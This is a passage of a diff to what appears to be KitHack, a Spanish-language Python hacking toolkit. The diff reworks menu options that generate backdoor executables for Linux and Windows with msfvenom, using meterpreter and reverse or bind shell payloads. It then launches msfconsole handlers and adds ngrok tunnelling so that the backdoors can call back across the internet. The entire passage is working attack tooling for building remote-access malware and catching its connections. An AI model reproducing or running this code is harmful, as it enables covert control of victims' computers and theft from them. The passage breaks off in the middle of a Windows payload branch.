 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 7:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))	
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
-					banner(), menu(), options()				
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()	
 
 			elif pay == 8:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
-					banner(), menu(), options()	
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()				
 
 			elif pay == 9:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x86/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 10:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()	
+
+			elif pay == 11:
+				os.system('python lib/network.py')
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
+				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+				time.sleep(4)
+				os.system('service postgresql start && msfvenom -p linux/x86/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
+				location = os.getcwd()
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()
+					else:
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+				else:
+					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+					banner(), menu(), options()	
+
+			elif pay == 12:
+				os.system('python lib/network.py')
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
+				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
+				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+				time.sleep(4)
+				os.system('service postgresql start && msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
+				location = os.getcwd()
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+						banner(), menu(), options()
+					else:
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+				else:
+					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+					time.sleep(3)
+					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			else:
@@ -1078,340 +1229,480 @@ def options():
 			print '{0}[01]{1} windows/x64/meterpreter_reverse_http'.format(WHITE, YELLOW)
 			print '{0}[02]{1} windows/x64/meterpreter_reverse_https'.format(WHITE, YELLOW)
 			print '{0}[03]{1} windows/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[04]{1} windows/x64/powershell_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[05]{1} windows/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[06]{1} windows/meterpreter_reverse_http'.format(WHITE, YELLOW)
-			print '{0}[07]{1} windows/meterpreter_reverse_https'.format(WHITE, YELLOW)
-			print '{0}[08]{1} windows/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[09]{1} windows/meterpreter/reverse_tcp_dns'.format(WHITE, YELLOW)
-			print '{0}[10]{1} windows/metsvc_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[11]{1} windows/powershell_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[12]{1} windows/shell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[04]{1} windows/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[05]{1} windows/x64/powershell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[06]{1} windows/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[07]{1} windows/meterpreter_reverse_http'.format(WHITE, YELLOW)
+			print '{0}[08]{1} windows/meterpreter_reverse_https'.format(WHITE, YELLOW)
+			print '{0}[09]{1} windows/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[10]{1} windows/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[11]{1} windows/meterpreter/reverse_tcp_dns'.format(WHITE, YELLOW)
+			print '{0}[12]{1} windows/metsvc_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[13]{1} windows/powershell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[14]{1} windows/shell_reverse_tcp'.format(WHITE, YELLOW)
 
 			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
 
 			if pay == 1:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()						
 
 			elif pay == 2:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 3:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
-					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
